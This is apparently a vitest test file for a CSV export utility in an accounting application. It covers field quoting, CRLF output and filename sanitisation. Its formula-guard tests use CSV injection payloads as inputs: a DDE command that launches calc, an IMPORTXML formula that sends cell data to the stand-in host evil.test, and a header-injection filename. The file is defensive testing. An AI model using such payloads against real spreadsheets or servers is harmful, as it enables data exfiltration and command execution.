import { describe, it, expect } from 'vitest';
import { csvField, toCsv, csvAttachment } from '../../src/utils/csv.js';

describe('csvField', () => {
  it('emits ordinary values bare', () => {
    expect(csvField('1100')).toBe('1100');
    expect(csvField('Caja')).toBe('Caja');
    expect(csvField(0)).toBe('0');
  });

  it('quotes a value containing a comma', () => {
    expect(csvField('Bancos, moneda extranjera')).toBe('"Bancos, moneda extranjera"');
  });

  it('quotes and doubles an embedded double quote', () => {
    expect(csvField('Cuenta "puente"')).toBe('"Cuenta ""puente"""');
  });

  it('quotes values containing CR or LF', () => {
    expect(csvField('dos\nrenglones')).toBe('"dos\nrenglones"');
    expect(csvField('dos\r\nrenglones')).toBe('"dos\r\nrenglones"');
  });

  it('renders null and undefined as the empty field, never as a word', () => {
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
  });
});

describe('csvField formula guard', () => {
  it('neutralises a field that opens a formula', () => {
    expect(csvField('=1+1')).toBe('"\'=1+1"');
    expect(csvField('@SUM(A1:A9)')).toBe('"\'@SUM(A1:A9)"');
    expect(csvField('+CMD|\'/c calc\'!A0')).toBe('"\'+CMD|\'/c calc\'!A0"');
  });

  it('neutralises the exfiltration shape an account name could carry', () => {
    // accounts.name is user input and this file is opened in Excel.
    expect(csvField('=IMPORTXML("http://evil.test?x="&A1,"//a")'))
      .toBe('"\'=IMPORTXML(""http://evil.test?x=""&A1,""//a"")"');
  });

  it('neutralises a leading TAB or CR', () => {
    expect(csvField('\t=1+1')).toBe('"\'\t=1+1"');
    expect(csvField('\r=1+1')).toBe('"\'\r=1+1"');
  });

  it('leaves negative amounts alone -- the reason the guard is not by first character', () => {
    // Decimal.toFixed(4) on any credit-balance account. Guarding these would
    // turn every such cell into text and break the columns that matter.
    expect(csvField('-21000.0000')).toBe('-21000.0000');
    expect(csvField(-21000)).toBe('-21000');
    expect(csvField('-0.5')).toBe('-0.5');
    expect(csvField('+5')).toBe('+5');
    expect(csvField('1.5e3')).toBe('1.5e3');
  });

  it('does not guard a formula character that is not leading', () => {
    expect(csvField('Caja = chica')).toBe('Caja = chica');
    expect(csvField('correo@ejemplo.test')).toBe('correo@ejemplo.test');
  });

  it('guards a bare hyphen, the one accepted false positive', () => {
    // A lone '-' as a placeholder becomes '- in the sheet. Carving out an
    // exception for it is not worth a special case in the predicate.
    expect(csvField('-')).toBe('"\'-"');
  });
});

describe('toCsv', () => {
  type Row = { code: string; name: string; total: string };
  const columns = ['code', 'name', 'total'] as const;

  it('writes a header row from the columns and CRLF terminators throughout', () => {
    const csv = toCsv<Row>(columns, [{ code: '1100', name: 'Caja', total: '10.0000' }]);
    expect(csv).toBe('code,name,total\r\n1100,Caja,10.0000\r\n');
  });

  it('terminates the last row too, so appending is safe', () => {
    const csv = toCsv<Row>(columns, [
      { code: '1100', name: 'Caja', total: '10.0000' },
      { code: '1200', name: 'Clientes', total: '20.0000' },
    ]);
    expect(csv.endsWith('\r\n')).toBe(true);
    expect(csv.split('\r\n').filter(Boolean)).toHaveLength(3);
  });

  it('emits only the header when there are no rows', () => {
    expect(toCsv<Row>(columns, [])).toBe('code,name,total\r\n');
  });

  it('follows the caller-declared column order, not the object key order', () => {
    const csv = toCsv<Row>(['total', 'code', 'name'], [{ name: 'Caja', total: '10.0000', code: '1100' }]);
    expect(csv).toBe('total,code,name\r\n10.0000,1100,Caja\r\n');
  });

  it('leaves a column absent from the row blank rather than writing undefined', () => {
    // The trial balance's beginning_balance case: declared on the type, never
    // selected by the query.
    const rows = [{ code: '1100', name: 'Caja' } as unknown as Row];
    expect(toCsv<Row>(columns, rows)).toBe('code,name,total\r\n1100,Caja,\r\n');
  });

  it('quotes fields inside a row, not just standalone values', () => {
    const csv = toCsv<Row>(columns, [{ code: '1100', name: 'Caja, chica', total: '10.0000' }]);
    expect(csv).toBe('code,name,total\r\n1100,"Caja, chica",10.0000\r\n');
  });
});

describe('csvAttachment', () => {
  it('builds a Content-Disposition value with a .csv extension', () => {
    expect(csvAttachment('trial-balance-abc123')).toBe('attachment; filename="trial-balance-abc123.csv"');
  });

  it('strips characters that would break out of the header', () => {
    // entity_id arrives from the query string and is never shape-checked.
    expect(csvAttachment('tb-"x\r\nX-Injected: 1')).toBe('attachment; filename="tb-xX-Injected1.csv"');
  });

  it('falls back to a fixed stem when nothing survives stripping', () => {
    expect(csvAttachment('///')).toBe('attachment; filename="export.csv"');
  });
});
